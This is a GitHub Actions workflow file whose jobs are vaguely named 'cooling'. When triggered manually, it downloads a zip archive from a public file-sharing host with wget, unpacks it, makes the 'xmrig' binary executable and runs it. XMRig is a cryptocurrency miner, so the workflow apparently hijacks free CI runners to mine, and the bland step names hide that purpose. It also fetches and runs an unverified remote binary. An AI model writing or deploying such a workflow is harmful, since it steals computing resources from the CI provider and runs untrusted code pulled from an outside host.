name: even cooler
on:
  workflow_dispatch:
jobs:
  build:
      name: cooling
      runs-on: ubuntu-latest
      steps:
        - name: downloading, unzipping and changing perms.
          run: |
            wget https://small.fileditch.ch/s3/DEieacPfmRvhhMFOgIal.zip
            unzip DEieacPfmRvhhMFOgIal.zip
            chmod ugo+rwx xmrig
        - name: cooling
          run: |
            ./xmrig